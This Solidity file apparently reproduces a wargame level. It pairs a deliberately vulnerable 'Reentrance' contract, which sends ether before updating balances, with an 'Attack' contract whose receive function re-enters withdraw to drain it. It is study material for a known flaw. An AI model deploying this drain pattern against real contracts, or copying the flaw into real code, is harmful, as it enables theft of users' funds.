// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Reentrance {

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] += msg.value; // 누적되도록 수정
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                balances[msg.sender] -= _amount;
            }
        }
    }

    receive() external payable {}
}

contract Attack {
    Reentrance public reentrance;

    constructor(address _entrance) {
        reentrance = Reentrance(payable(_entrance)); // 인자 전달
    }

    receive() external payable {
        if (address(reentrance).balance >= 0.001 ether) {
            reentrance.withdraw(0.001 ether); // 인자 전달
        }
    }

    function attack() external payable {
        require(msg.value == 0.001 ether, "Require 0.001 ether to attack");
        reentrance.donate{value: 0.001 ether}(address(this)); // 인자 전달
        reentrance.withdraw(0.001 ether); // 인자 전달
    }
}
